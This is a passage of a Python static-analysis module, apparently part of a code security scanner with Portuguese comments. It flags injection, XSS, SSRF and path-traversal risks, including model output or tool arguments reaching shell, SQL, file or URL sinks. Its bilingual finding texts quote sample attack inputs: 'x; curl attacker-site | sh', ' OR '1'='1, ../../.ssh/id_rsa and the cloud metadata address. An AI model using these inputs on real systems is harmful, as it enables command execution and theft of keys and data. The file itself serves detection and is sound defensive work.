"""Falhas no código da aplicação (injeção, XSS, TLS desligado...) e erros típicos de código que chama modelos de IA.

Python é lido com ast. JavaScript/TypeScript não tem parser na biblioteca padrão: os padrões rodam sobre o código
sem comentários e sem o texto das strings (_js_mask), e as regras de injeção só disparam quando o valor vem de um
lugar conhecido: a requisição, a resposta do modelo ou um argumento colocado direto no meio do SQL.

Origem de um valor: REQ (veio da requisição HTTP), LLM (resposta do modelo), TOOL (argumento que o modelo preenche ao
chamar uma ferramenta), PARAM (argumento de função, origem desconhecida), NET (resposta de outro servidor) e SEG (pedaço
do caminho da rota, que não tem "/").
"""
from __future__ import annotations

import ast
import bisect
import collections
import re
import string
import warnings

from ..model import SEV_RANK, Finding
from . import TESTISH, is_text_source, line_of
from .secrets import drop_inline_ignored

REQ, LLM, TOOL, PARAM, NET, SEG = "req", "llm", "tool", "param", "net", "seg"
MODEL = {LLM, TOOL}
# SEG: parâmetro que é um pedaço do caminho da rota (/files/{name}). FastAPI, Flask e Django não deixam "/" nele, então
# conta como dado da requisição para injeção, mas não monta caminho de arquivo nem URL inteira.
REQ_ANY = {REQ, SEG}
_PY_MAX = 1_000_000
_JS_MAX = 500_000
_CACHE_KEY = ("__code__",)
_PER_FILE = 40  # achados por arquivo: um arquivo gerado não enche o relatório
_STR_PARTS = 40  # pedaços de um texto montado com += que ainda vale a pena remontar
_PIECES = 400  # partes remontadas por texto, somando os textos montados que ele usa

_SRC = {REQ: ("dados da requisição", "request input"), PARAM: ("um argumento da função", "a function argument")}


def _src(origin):
    pt, en = _SRC[origin]
    return {"source_pt": pt, "source_en": en}


_LLM_SINK = {
    # tipo: (onde chega pt, com a preposição ("à página", não "a a página"), en, o que vira pt, en, como corrigir pt, en)
    "code": ("a eval/exec", "eval/exec", "código rodando no seu servidor", "code running on your server",
             "não execute a resposta; peça JSON, valide os campos e chame só funções de uma lista fixa.",
             "do not run the answer; ask for JSON, validate it and call only functions from a fixed list."),
    "shell": ("a um comando de shell", "a shell command", "comandos rodando no seu servidor", "commands running on your server",
              "mapeie a resposta para comandos de uma lista fixa e passe os argumentos em lista, sem shell.",
              "map the answer to commands from a fixed list and pass arguments as a list, without a shell."),
    "template": ("a um template", "a template", "código rodando no seu servidor", "code running on your server",
                 "use um template fixo e passe a resposta como variável.", "use a fixed template and pass the answer as a variable."),
    "sql": ("a uma consulta SQL", "a SQL query", "leitura ou exclusão dos seus dados", "reading or deleting your data",
            "rode com um usuário de banco só de leitura, limitado às tabelas necessárias, ou deixe o modelo só preencher "
            "parâmetros de consultas escritas por você. Nome de coluna ou de tabela não pode ser parâmetro: escolha o nome "
            "numa lista fixa.",
            "run it with a read-only database user limited to the tables it needs, or let the model only fill parameters "
            "of queries you wrote. A column or table name cannot be a parameter: pick it from a fixed list."),
    "html": ("à página como HTML", "the page as HTML", "scripts rodando no navegador de quem usa o app",
             "scripts running in your users' browsers",
             "mostre como texto, ou converta o Markdown e limpe com DOMPurify.sanitize antes de inserir.",
             "show it as text, or convert the Markdown and clean it with DOMPurify.sanitize before inserting it."),
}


def _llm_params(kind):
    s = _LLM_SINK[kind]
    return {"sink_pt": s[0], "sink_en": s[1], "impact_pt": s[2], "impact_en": s[3], "fix_pt": s[4], "fix_en": s[5]}


# APP014: argumento que o modelo preenche ao chamar uma ferramenta (MCP, AI SDK, LangChain, tool calling). Por tipo de
# sink: (onde chega pt, com a preposição ("à página", não "a a página"), en, o que acontece pt, en, como corrigir pt,
# en, resumo do impacto pt, en). "_any" é a variante em que a ferramenta recebe o valor inteiro (o comando, o caminho):
# é o desenho dela, e o risco é o alcance.
_TOOL_SINK = {
    "shell": ("a um comando de shell", "a shell command",
              "Um valor como \"x; curl site-do-atacante | sh\" vira um segundo comando rodando na máquina onde a ferramenta "
              "roda, com os arquivos e as chaves dela.",
              "A value such as \"x; curl attacker-site | sh\" becomes a second command running on the machine where the tool "
              "runs, with its files and keys.",
              "Rode o programa com uma lista de argumentos e sem shell (execFile, spawn sem shell, subprocess.run([...])) e "
              "aceite só valores de uma lista fixa.",
              "Run the program with an argument list and no shell (execFile, spawn without a shell, subprocess.run([...])) "
              "and accept only values from a fixed list.",
              "rodar comandos na máquina onde ela está instalada", "run commands on the machine where it is installed"),
    "shell_any": ("a um comando de shell", "a shell command",
                  "A ferramenta roda o comando inteiro que o modelo escrever: uma instrução escondida vira um comando na "
                  "máquina onde a ferramenta roda.",
                  "The tool runs whatever command the model writes: one hidden instruction becomes a command on the machine "
                  "where the tool runs.",
                  "Se a ferramenta precisa rodar comandos, aceite só os de uma lista fixa, rode sem shell e peça confirmação "
                  "a quem usa antes de cada um.",
                  "If the tool must run commands, accept only commands from a fixed list, run them without a shell, and ask "
                  "the user to confirm each one.",
                  "rodar comandos na máquina onde ela está instalada", "run commands on the machine where it is installed"),
    "code": ("a eval/exec", "eval/exec",
             "O texto roda como código na máquina onde a ferramenta roda, com os arquivos e as chaves dela.",
             "The text runs as code on the machine where the tool runs, with its files and keys.",
             "Não execute o valor: leia o dado que você espera (JSON.parse, json.loads, ast.literal_eval) ou mapeie para "
             "funções de uma lista fixa.",
             "Do not run the value: parse the data you expect (JSON.parse, json.loads, ast.literal_eval) or map it to "
             "functions from a fixed list.",
             "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
    "template": ("a um template", "a template",
                 "Sintaxe de template no valor roda como código na máquina onde a ferramenta roda.",
                 "Template syntax in the value runs as code on the machine where the tool runs.",
                 "Use um template fixo e passe o valor como variável.", "Use a fixed template and pass the value as a variable.",
                 "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
    "sql": ("a uma consulta SQL", "a SQL query",
            "Um valor como ' OR '1'='1 muda a consulta e pode ler, alterar ou apagar dados do banco.",
            "A value such as ' OR '1'='1 changes the query and can read, change or delete data in the database.",
            "Passe o valor como parâmetro da consulta (?, %s, $1) e use um usuário de banco só com as permissões de que a "
            "ferramenta precisa. Nome de coluna ou de tabela não pode ser parâmetro: escolha o nome numa lista fixa.",
            "Pass the value as a query parameter (?, %s, $1) and use a database user with only the permissions the tool needs. "
            "A column or table name cannot be a parameter: pick it from a fixed list.",
            "ler, alterar ou apagar dados do banco", "read, change or delete data in the database"),
    "path": ("a um caminho de arquivo", "a file path",
             "Um valor como ../../.ssh/id_rsa sai da pasta que a ferramenta deveria usar e lê ou sobrescreve qualquer arquivo "
             "que ela alcança, chaves incluídas.",
             "A value such as ../../.ssh/id_rsa leaves the folder the tool is meant to use and reads or overwrites any file it "
             "can reach, keys included.",
             "Resolva o caminho e confira que ele continua dentro da pasta permitida (path.resolve + startsWith, "
             "Path.resolve().is_relative_to) ou fique só com o nome do arquivo (basename).",
             "Resolve the path and check that it stays inside the allowed folder (path.resolve + startsWith, "
             "Path.resolve().is_relative_to), or keep only the file name (basename).",
             "ler ou sobrescrever arquivos fora da pasta dela, chaves incluídas",
             "read or overwrite files outside its folder, keys included"),
    "path_any": ("a um caminho de arquivo", "a file path",
                 "A ferramenta abre qualquer arquivo que o modelo indicar, não só os que ela deveria usar: dá para ler ou "
                 "sobrescrever ~/.ssh, .env e as chaves de quem instalou.",
                 "The tool opens any file the model names, not only the ones it is meant to use: it can read or overwrite "
                 "~/.ssh, .env and the keys of whoever installed it.",
                 "Limite a ferramenta a uma pasta: resolva o caminho e confira que ele continua dentro dela (path.resolve + "
                 "startsWith, Path.resolve().is_relative_to).",
                 "Limit the tool to one folder: resolve the path and check that it stays inside it (path.resolve + startsWith, "
                 "Path.resolve().is_relative_to).",
                 "ler ou sobrescrever qualquer arquivo da máquina, chaves incluídas",
                 "read or overwrite any file on the machine, keys included"),
    "url": ("a um endereço que o servidor busca", "a URL the server fetches",
            "O modelo escolhe o endereço: a ferramenta pode ser apontada para a sua rede local, para serviços em localhost ou "
            "para o endereço de metadados da nuvem (169.254.169.254), que entrega credenciais.",
            "The model picks the address: the tool can be pointed at your local network, at services on localhost or at the "
            "cloud metadata address (169.254.169.254), which hands out credentials.",
            "Aceite só os domínios de que a ferramenta precisa e bloqueie endereços privados, locais e de metadados antes de "
            "buscar.",
            "Allow only the domains the tool needs and block private, local and metadata addresses before fetching.",
            "chamar endereços internos e o serviço de metadados da nuvem", "call internal addresses and the cloud metadata service"),
    "deserialize": ("a pickle ou YAML inseguro", "pickle or unsafe YAML",
                    "Carregar esse conteúdo pode rodar código na máquina onde a ferramenta roda.",
                    "Loading that content can run code on the machine where the tool runs.",
                    "Use JSON ou yaml.safe_load para o que a ferramenta recebe.", "Use JSON or yaml.safe_load for what the tool receives.",
                    "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
    "html": ("à página como HTML", "the page as HTML",
             "Um <script> no valor roda no navegador de quem vê a página.",
             "A <script> in the value runs in the browser of whoever sees the page.",
             "Mostre como texto ou limpe com DOMPurify.sanitize antes de inserir.",
             "Show it as text or clean it with DOMPurify.sanitize before inserting it.",
             "rodar scripts no navegador de quem usa o app", "run scripts in your users' browsers"),
}
_TOOL_SEV = {"shell": "high", "code": "high", "template": "high", "sql": "high", "path": "medium", "url": "medium",
             "deserialize": "high", "html": "medium"}


def _tool_params(kind, built=False):
    """Textos da APP014. built: o valor entra no meio de um comando, consulta ou caminho escrito no código."""
    variant = kind + "_any" if not built and kind + "_any" in _TOOL_SINK else kind
    s = _TOOL_SINK[variant]
    return {"kind": kind, "sink_pt": s[0], "sink_en": s[1], "detail_pt": s[2], "detail_en": s[3], "fix_pt": s[4],
            "fix_en": s[5], "impact_pt": s[6], "impact_en": s[7]}


def _tool_sev(kind, built):
    """Comando ou código montado com o valor é crítico; o caminho montado sai da pasta pretendida (alto)."""
    if built and kind in ("shell", "code", "template"):
        return "critical"
    if built and kind == "path":
        return "high"
    return _TOOL_SEV[kind]


class _Out:
    """Junta os achados de um arquivo: um por regra e linha, ficando o mais grave."""

    def __init__(self, rel):
        self.rel = rel
        self.items = {}

    def add(self, rule, sev, line, params=None):
        key = (rule, line)
        old = self.items.get(key)
        if old is None or SEV_RANK[sev] > SEV_RANK[old.severity]:
            self.items[key] = Finding(rule, sev, self.rel, line, dict(params or {}))

    def tool(self, kind, built, line, sev=None):
        self.add("APP014", sev or _tool_sev(kind, built), line, _tool_params(kind, built))

    def list(self):
        # O mesmo sink alcançado pelo argumento da ferramenta: fica a APP014, que explica a origem; o achado "veio de um
        # argumento da função" (origem desconhecida) na mesma linha é o mesmo problema visto sem contexto.
        tool_lines = {k[1] for k in self.items if k[0] == "APP014"}
        found = [f for f in self.items.values()
                 if not (f.line in tool_lines and f.rule.startswith("COD") and f.params.get("source_en") == _SRC[PARAM][1])]
        found = sorted(found, key=lambda f: (-SEV_RANK[f.severity], f.line or 0))
        return sorted(found[:_PER_FILE], key=lambda f: (f.line or 0, f.rule))


# Nome de variável que guarda segredo: a última palavra decide (reset_token sim, token_count não).
_SECRET_LAST = {"token", "password", "passwd", "pwd", "secret", "otp", "nonce", "salt", "csrf", "passcode", "pin"}
_SECRET_KEY_BEFORE = {"api", "secret", "private", "access", "signing", "encryption", "session", "auth", "license", "client"}
_SECRET_CODE_BEFORE = {"reset", "verification", "verify", "auth", "otp", "invite", "invitation", "activation", "confirm",
                       "confirmation", "recovery", "mfa", "login", "access", "magic", "security", "one", "email", "sms"}


def _words(name):
    name = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", name)
    return [w for w in re.split(r"[^A-Za-z0-9]+", name.lower()) if w]


def secret_name(name):
    w = _words(name or "")
    if not w:
        return False
    last, before = w[-1], (w[-2] if len(w) > 1 else "")
    if last in _SECRET_LAST or last == "apikey":
        return True
    if last == "key":
        return before in _SECRET_KEY_BEFORE
    return last == "code" and before in _SECRET_CODE_BEFORE


def session_name(name):
    """session_id, sessionId, sid: identificador de sessão, que só é segredo quando vai para um cookie."""
    low = (name or "").lower()
    if "sid" not in low and "sess" not in low:
        return False
    w = _words(name or "")
    return bool(w) and (w[-1] == "sid" or w == ["session"] or w[-1] == "id" and len(w) > 1 and w[-2] in ("session", "sess"))


def _cookie_holds(text, name):
    """O valor vai para um cookie: res.cookie("sid", sessionId), set_cookie("session", session_id), Set-Cookie."""
    if "ookie" not in text:
        return False
    return bool(re.search(r"(?:\.cookie\s*\(|cookies\s*\.\s*set\s*\(|set_cookie\s*\(|setCookie\s*\(|Set-Cookie|"
                          r"document\s*\.\s*cookie\s*=)[^;\n]{0,200}(?<![\w$])" + re.escape(name) + r"(?![\w$])", text))


def password_name(name):
    w = _words(name or "")
    return bool(w) and w[-1] in ("password", "passwd", "pwd", "passphrase", "senha")


# Texto que parece SQL de verdade (estrutura, não só a palavra "select" numa frase).
_SQL_LOOK = re.compile(r"""(?isx)
  ^\s*\(?\s*(?:
     select\s+(?:\*|distinct\b|count\s*\(|exists\b|top\s+\d|[\w.*"`\[\]]+(?:\s+as\s+\w+)?\s*(?:,|\bfrom\b))
    |insert\s+(?:or\s+\w+\s+)?into\s+[\w."`\[]
    |update\s+[\w."`\[\]]+\s+set\s
    |delete\s+from\s
    |with\s+(?:recursive\s+)?\w+\s+as\s*\(
    |(?:create|drop|alter|truncate)\s+(?:or\s+replace\s+)?(?:temp(?:orary)?\s+)?(?:table|index|view|database|schema|function|trigger|extension|sequence|role|user)\b
    |(?:replace|merge)\s+into\s
    |pragma\s+\w
    |(?:grant|revoke)\s+\w
  )""")
# O valor entra onde vai um dado ('...', = x, LIKE '%x', IN (x)), não um nome de tabela ou coluna ("tabela", ORDER BY x).
_VALUE_POS = re.compile(r"""(?:'|%|(?:[=<>]|\blike|\bilike|\bin\s*\(|\bvalues\s*\()\s*["'%]*)$""", re.I)
# Começo de endereço que para onde o host ou a porta começa: "https://", "//", "http://localhost:". O que vem depois
# decide o servidor ("evil.com/?", "@evil.com"). "https://api.example.com" + caminho é a base do código mais o caminho.
_IN_HOST = re.compile(r"(?:[A-Za-z][A-Za-z0-9+.-]*:)?//(?:[^/?#\\\s]*[.:@])?\Z")
# Cabeçalhos que dizem o host da própria requisição: o navegador de outra pessoa não escolhe o valor (o SSRF por eles
# depende de chamar o servidor direto ou de um proxy que repassa o que chega).
_HOST_HEADERS = {"host", "x-forwarded-host", "x-original-host", "x-forwarded-server", "forwarded"}
# Começo de redirect feito só de barras ("/", "\\", "//"): o que vem depois pode ser o host de outro site.
_ONLY_SLASHES = re.compile(r"[/\\]{1,8}\Z")
_SQL_DDL = re.compile(r"\s*\(?\s*(?:pragma|create|drop|alter|truncate)\b", re.I)
# Nome de variável que costuma guardar placeholders (",".join("?" * n)) ou um pedaço de SQL escrito no código (tabela,
# coluna, ORDER BY, WHERE montado). O pedaço só conta fora da posição de dado: '{query}' é o texto da busca. marks é a
# palavra inteira (marks, qmarks, question_marks, questionMarks): remarks e bookmarks são dado.
_PLACEHOLDER = re.compile(r"(?i:placeholder|^q?marks$|_marks$|^ph$|^qs$|params?_?(?:str|sql|list)|bind)|[a-z0-9]Marks$")
_PY_SQL_PART = re.compile(r"(?i)^(?:table|tables|table_name|tablename|schema|columns?|cols|fields|col|column_name|order|"
                          r"direction|sort_dir|where|where_clause|conditions?|clause|set_clause|joins?|filters?_sql|sql|query|"
                          r"select|limit|offset|n|i|idx|count)$")
_JS_SQL_PART = re.compile(r"(?i)^(?:table|tableName|schema|columns?|cols|fields|order|direction|sortDir|where|whereClause|"
                          r"conditions?|clause|setClause|joins?|sql|query|select|limit|offset|i|idx|n|count)$")
# Desses nomes, os que guardam um pedaço inteiro de SQL (WHERE montado, a consulta), não um nome de coluna ou tabela.
_SQL_FRAGMENT = re.compile(r"(?i)^(?:where(?:_?clause)?|conditions?|clause|set_?clause|joins?|filters?_?sql|sql|query)$")
# Origem mais forte entre achados da mesma consulta com a mesma severidade.
_SQL_ORIGIN_RANK = {LLM: 3, TOOL: 2, REQ: 1, PARAM: 0}


def _sql_best(best, v):
    """O achado que fica para a consulta: o mais grave e, empatado, o do modelo, da ferramenta, da requisição."""
    if best is None or (SEV_RANK[v[0]], _SQL_ORIGIN_RANK[v[1]]) > (SEV_RANK[best[0]], _SQL_ORIGIN_RANK[best[1]]):
        return v
    return best


# Uma string que começa como SQL (para saber se vale procurar consultas no arquivo).
_SQL_VERB = re.compile(r"\s*\(?\s*(?:select|insert|update|delete|with|create|drop|alter|truncate|replace|merge|pragma|grant|"
                       r"revoke)\b", re.I)


def looks_sql(text):
    return bool(_SQL_LOOK.match(text[:400]))


# =========================================================================== Python

_PY_WEB = {"flask", "fastapi", "django", "starlette", "aiohttp", "tornado", "sanic", "quart", "falcon", "bottle",
           "litestar", "rest_framework", "werkzeug", "pyramid", "cherrypy", "responder", "blacksheep", "robyn"}
_PY_LLM_MODS = ("openai", "anthropic", "google.generativeai", "google.genai", "groq", "mistralai", "cohere", "langchain",
                "langchain_", "litellm", "together", "replicate", "huggingface_hub", "llama_index", "instructor",
                "pydantic_ai", "langgraph", "fireworks", "voyageai", "ollama", "vertexai", "boto3")
_REQ_ATTRS = {"args", "form", "values", "json", "data", "files", "cookies", "headers", "GET", "POST", "body",
              "query_params", "path_params", "COOKIES", "FILES", "get_json", "get_data", "query_string", "view_args",
              "match_info", "query", "post", "content", "text", "stream"}
# Atributos de "request" que só existem na requisição de framework web (req.query é ambíguo em código cliente).
_REQ_ATTRS_STRICT = {"args", "form", "values", "json", "files", "cookies", "GET", "POST", "query_params", "path_params",
                     "COOKIES", "FILES", "get_json", "get_data", "view_args", "match_info", "data", "body", "headers",
                     "query_string", "post"}
_CLI_DECO = re.compile(r"(?:^|\.)(?:command|argument|option|group|callback)$")
_ROUTE_SEG = re.compile(r"\{(\w+)(?::([^{}]*))?\}|<(?:(\w+)(?:\([^)]*\))?:)?(\w+)>")
_SEG_CONV = {"str", "string", "slug", "default"}
_TYPED_CONV = {"int", "float", "uuid"}
# Tipo que o framework valida antes de chamar a função (FastAPI, Flask, MCP): não dá para mandar texto nele.
_SCALAR_ANN = {"int", "float", "bool", "UUID", "date", "datetime", "time", "timedelta", "Decimal", "PositiveInt",
               "NegativeInt", "NonNegativeInt", "NonPositiveInt", "PositiveFloat", "NonNegativeFloat", "StrictInt",
               "StrictFloat", "StrictBool", "conint", "confloat"}
_ROUTE_DECO = re.compile(r"(?:^|\.)(?:get|post|put|patch|delete|route|api_route|websocket|api_view|view_config)$")
# Ferramenta que o modelo chama: FastMCP @mcp.tool, MCP @server.call_tool, LangChain/CrewAI/smolagents @tool, OpenAI
# Agents @function_tool, Pydantic AI @agent.tool_plain, Anthropic @beta_tool, Semantic Kernel @kernel_function.
_TOOL_DECO = re.compile(r"(?:^|\.)(?:tool|tool_plain|function_tool|call_tool|beta_tool|beta_async_tool|kernel_function)$")
# Registro sem decorador: mcp.add_tool(f), Tool.from_function(f), FunctionTool.from_defaults(fn=f), Agent(tools=[f]).
_TOOL_REGISTER = {"add_tool", "from_function", "from_defaults", "FunctionTool", "StructuredTool", "Tool", "LongRunningFunctionTool"}
# Classe de ferramenta de framework de agente: o modelo preenche os argumentos de _run/forward.
_TOOL_BASES = {"BaseTool", "Tool", "StructuredTool", "AsyncBaseTool"}
_TOOL_BASE_MODS = ("langchain", "crewai", "smolagents", "llama_index", "pydantic_ai", "autogen", "agents", "haystack")
_TOOL_METHODS = {"_run", "_arun", "forward", "call", "acall"}
# Parâmetro que o framework injeta na ferramenta (contexto, config, callbacks, estado), não o modelo.
_TOOL_INJECTED_NAME = {"ctx", "context", "run_context", "tool_context", "wrapper", "run_manager", "callbacks", "config",
                       "runtime", "tool_call_id"}
_TOOL_INJECTED_ANN = re.compile(r"(?i)context|ctx$|runmanager|callback|injected|config$|runtime|wrapper|progress|session$|"
                                r"client$|logger$")
# Leitura dos argumentos de uma chamada de ferramenta da API: OpenAI tool_call.function.arguments, Responses
# item.arguments, Anthropic block.input, Gemini function_call.args.
_TOOL_CALL_NAME = re.compile(r"(?i)^(?:\w*_)?(?:tool_?call|function_?call|call|tc|fc|item|params|output)$")
_TOOL_BLOCK_NAME = re.compile(r"(?i)^(?:\w*_)?(?:block|tool_?use(?:_?block)?|tu|part|content|tool_?call|call)$")
_TOOL_TEXT = ("tool_call", "function_call", "tool_use", "toolUse", "call_tool", "CallToolRequest", ".arguments")
# Texto que precisa existir para valer a pena procurar registro sem decorador (add_tool(f), tools=[f]).
_TOOL_REF_TEXT = ("add_tool", "from_function", "from_defaults", "Tool(", "tools=", "tools =")
_SQL_HELPER = re.compile(r"(?i)^_*(?:(?:execute|exec|run|raw)_?(?:query|sql|statement|read_query|write_query)|"
                         r"query_?(?:db|sql|database)|sql_?query|run_?read_?only_?query)$")
_NOT_REQ_ANN = re.compile(r"(?i)(?:dep|deps|dependency|session|db|user|request|response|websocket|tasks?|connection|"
                          r"settings|config|client|logger|context|ctx|engine|cursor)$")
# Fim do nome de um modelo do corpo da requisição (ChatRequest, UserCreate, ItemUpdate, QueryIn, SearchPayload), depois de
# uma letra minúscula ou dígito: Request sozinho, Login e Plugin não contam.
_BODY_ANN = re.compile(r"(?<=[a-z0-9])(?:Request|Req|Create|Update|Upsert|Patch|In|Input|Body|Payload|Params|Form|Data|"
                       r"Query|Message|Schema|Dto|DTO)$")
_FRAMEWORK_REQ_ANN = {"HttpRequest", "BaseRequest"}  # Django, aiohttp: também quando a anotação é texto
_NOT_REQ_PARAM = {"request", "req", "db", "session", "background_tasks", "response", "websocket", "current_user", "user",
                  "settings", "self", "cls", "ctx", "context"}

_KILL = {"int", "float", "bool", "len", "abs", "round", "hash", "ord", "isinstance", "callable", "isdigit", "isnumeric",
         "isalnum", "isalpha", "startswith", "endswith", "count", "index", "find", "secure_filename", "basename",
         "quote", "escape", "clean", "sanitize", "UUID", "uuid4", "uuid1", "bleach.clean", "literal_eval", "id", "type",
         "exists", "isfile", "isdir", "sum", "any", "all", "urlencode", "quote_plus", "fullmatch", "match", "hexdigest",
         "digest", "token_hex", "token_urlsafe", "url_for", "url_path_for", "reverse_lazy", "django.urls.reverse",
         "django.shortcuts.resolve_url"}
# Funções que devolvem o próprio dado, transformado (texto, caminho, JSON, base64): o que entra continua no resultado.
# As outras (consulta ao banco, get_file_by_id, helpers) devolvem outra coisa e não herdam a origem dos argumentos;
# o objeto da chamada continua valendo (request.args.get("x") é dado da requisição).
_PASS = {"str", "repr", "bytes", "bytearray", "format", "format_map", "join", "replace", "split", "rsplit", "splitlines",
         "partition", "rpartition", "encode", "decode", "strip", "lstrip", "rstrip", "lower", "upper", "casefold", "title",
         "capitalize", "removeprefix", "removesuffix", "loads", "dumps", "dict", "list", "tuple", "set", "frozenset", "sorted",
         "reversed", "map", "Path", "PurePath", "PosixPath", "WindowsPath", "joinpath", "with_name", "with_suffix",
         "normpath", "abspath", "expanduser", "expandvars", "dirname", "splitext", "urljoin", "urlunparse", "urlunsplit",
         "urlparse", "urlsplit", "unquote", "unquote_plus", "unescape", "b64decode", "urlsafe_b64decode", "b64encode",
         "urlsafe_b64encode", "decodebytes", "a2b_base64", "unhexlify", "fromhex", "decompress", "BytesIO", "StringIO",
         "dedent", "indent", "substitute", "safe_substitute", "cast", "markdown", "render"}
_PY_LLM_TEXT = (".chat.completions.create", ".completions.create", ".chat.completions.parse", ".messages.create",
                ".messages.stream", ".responses.create", ".responses.parse", ".responses.stream", ".generate_content",
                ".generate_content_async", "ChatCompletion.create", "ChatCompletion.acreate", "Completion.create",
                ".chat.complete", ".chat.complete_async", ".chat.stream", "litellm.completion", "litellm.acompletion",
                "ollama.chat", "ollama.generate", ".models.generate_content", ".text_generation", ".chat_completion")
_PY_LLM_COST = _PY_LLM_TEXT + (".embeddings.create", ".images.generate", ".images.edit", ".audio.speech.create",
                               ".audio.transcriptions.create", ".embed_content", "litellm.embedding", ".embed")
_LC_METHODS = {"invoke", "ainvoke", "predict", "apredict", "batch", "abatch", "stream", "astream", "generate", "agenerate",
               "complete", "acomplete", "chat", "achat", "run", "arun", "kickoff", "kickoff_async"}
_LC_RECEIVER = re.compile(r"(?i)llm|chain|model|agent|chat|crew|engine|graph|runnable|executor|pipeline")
_PY_SUBPROCESS = {"subprocess.run", "subprocess.call", "subprocess.check_call", "subprocess.check_output", "subprocess.Popen"}
_PY_SHELL = {"os.system", "os.popen", "subprocess.getoutput", "subprocess.getstatusoutput", "asyncio.create_subprocess_shell",
             "commands.getoutput", "os.popen2", "os.popen3", "os.popen4"}
_PY_EXEC_ARGV = {"asyncio.create_subprocess_exec", "os.execv", "os.execvp", "os.execvpe", "os.spawnv", "os.spawnvp"}
_PY_SQL_METHODS = {"execute", "executemany", "executescript", "exec_driver_sql", "raw", "read_sql", "read_sql_query",
                   "mogrify", "fetch", "fetchrow", "fetchval", "query", "sql"}
# Argumentos do QuerySet.extra do Django que vão crus para o SQL.
_DJ_EXTRA = ("where", "select", "tables")
_PY_SQL_RECEIVER = re.compile(r"(?i)cur|conn|con$|db|database|session|engine|sql|sqlite|pg|mysql|duck|client|pool|tx|"
                              r"transaction|executor|pd|pandas|spark")
_SQL_BUILDERS = {"select", "insert", "update", "delete", "where", "filter", "filter_by", "order_by", "group_by", "limit",
                 "offset", "values", "join", "outerjoin", "returning", "on_conflict_do_update", "on_conflict_do_nothing",
                 "having", "union", "union_all", "text", "table", "column", "literal", "bindparam", "and_", "or_", "exists",
                 "cte", "subquery", "alias", "scalar_subquery", "with_only_columns", "distinct", "options",
                 "execution_options", "params", "Query", "query", "select_from", "correlate", "prefix_with", "suffix_with",
                 "lateral", "upsert", "SQL", "Composed", "format", "mogrify", "compile", "statement"}
_PY_UNPICKLE = {"pickle.loads", "pickle.load", "cPickle.loads", "cPickle.load", "_pickle.loads", "_pickle.load",
                "dill.loads", "dill.load", "cloudpickle.loads", "cloudpickle.load", "jsonpickle.decode", "marshal.loads",
                "marshal.load", "pandas.read_pickle", "joblib.load", "shelve.open", "numpy.load"}
_PY_HTTP = {"get", "post", "put", "patch", "delete", "head", "options", "request", "stream", "send", "urlopen",
            "Client", "AsyncClient", "Session", "ClientSession", "client", "resource", "TCPConnector", "ws_connect",
            "Request", "fetch", "build_opener", "HTTPSConnection", "HTTPConnection", "AsyncHTTPTransport", "HTTPTransport"}
_PY_CLIENT_CTOR = {"requests.Session", "requests.session", "httpx.Client", "httpx.AsyncClient", "aiohttp.ClientSession",
                   "urllib3.PoolManager"}
_PY_FILE_SINKS = {"open", "io.open", "codecs.open", "aiofiles.open", "builtins.open", "os.remove", "os.unlink",
                  "shutil.rmtree", "os.rmdir", "flask.send_file", "send_file", "starlette.responses.FileResponse",
                  "fastapi.responses.FileResponse", "FileResponse", "django.http.FileResponse", "os.listdir",
                  "shutil.copy", "shutil.copyfile", "shutil.move"}
_SAFE_LOADERS = ("SafeLoader", "BaseLoader", "FullLoader")
_EXT_STR = {"lower", "upper", "casefold", "strip", "lstrip", "rstrip"}
_PATH_METHODS = {"read_text", "read_bytes", "open", "write_text", "write_bytes", "unlink", "rmdir", "iterdir"}
_PY_REDIRECT = ("redirect", "RedirectResponse", "HttpResponseRedirect", "HttpResponsePermanentRedirect")
_PY_HTML = ("Markup", "mark_safe", "SafeString", "HTMLResponse", "HttpResponse", "make_response", "Response")
_PY_RANDOM = {"random.random", "random.randint", "random.choice", "random.choices", "random.randrange", "random.sample",
              "random.getrandbits", "random.uniform", "random.shuffle", "random.randbytes", "numpy.random.randint",
              "numpy.random.choice", "numpy.random.rand", "numpy.random.random", "numpy.random.bytes"}
_PY_HASH = {"hashlib.md5": "MD5", "hashlib.sha1": "SHA-1", "hashlib.sha224": "SHA-224", "hashlib.sha256": "SHA-256",
            "hashlib.sha384": "SHA-384", "hashlib.sha512": "SHA-512", "hashlib.sha3_256": "SHA3-256",
            "hashlib.sha3_512": "SHA3-512", "hashlib.blake2b": "BLAKE2b", "hashlib.blake2s": "BLAKE2s"}
_AGENT_EXEC_TOOLS = {"PythonREPLTool": "PythonREPLTool", "PythonAstREPLTool": "PythonAstREPLTool", "PythonREPL": "PythonREPL",
                     "ShellTool": "ShellTool", "BashProcess": "BashProcess", "create_python_agent": "create_python_agent",
                     "PALChain": "PALChain", "LLMBashChain": "LLMBashChain", "PandasQueryEngine": "PandasQueryEngine",
                     "LocalCommandLineCodeExecutor": "LocalCommandLineCodeExecutor"}
_AGENT_SQL_TOOLS = {"SQLDatabaseChain", "create_sql_agent", "QuerySQLDataBaseTool", "QuerySQLDatabaseTool", "NLSQLTableQueryEngine"}
_GUARD_PATH = re.compile(r"\.(?:startswith|is_relative_to|relative_to)\s*\(|commonpath|safe_join|secure_filename|realpath|"
                         r"\.resolve\s*\(|basename|normpath|fullmatch|is_within|is_safe_path|['\"]\.\.(?:[/\\\\'\"])")
_GUARD_URL = re.compile(r"urlparse|urlsplit|\.hostname|\.netloc|ipaddress|is_private|private_ip|is_global|is_loopback|"
                        r"allow(?:ed)?_?(?:hosts|domains|list)|whitelist|allowlist|startswith")
_ADMIN = re.compile(r"(?i)admin|superuser|staff_member|is_staff")
_GUARD_REDIRECT = re.compile(r"url_has_allowed_host_and_scheme|is_safe_url|urlparse|urlsplit|\.netloc|startswith|"
                             r"allowed_hosts|ALLOWED_HOSTS|safe_url|is_safe")


_SKIP_NODES = (ast.expr_context, ast.operator, ast.cmpop, ast.unaryop, ast.boolop)


def _walk(node):
    """ast.walk mais leve: mesma ordem, sem visitar Load/Store e operadores."""
    todo = collections.deque([node])
    while todo:
        n = todo.popleft()
        yield n
        for f in n._fields:
            v = getattr(n, f, None)
            if isinstance(v, list):
                todo.extend(x for x in v if isinstance(x, ast.AST) and not isinstance(x, _SKIP_NODES))
            elif isinstance(v, ast.AST) and not isinstance(v, _SKIP_NODES):
                todo.append(v)


def _marked_lines(text, needles):
    """Números (ordenados) das linhas em que aparece algum dos trechos; None quando são tantas que não vale filtrar."""
    pos = []
    for t in needles:
        i = text.find(t)
        while i >= 0:
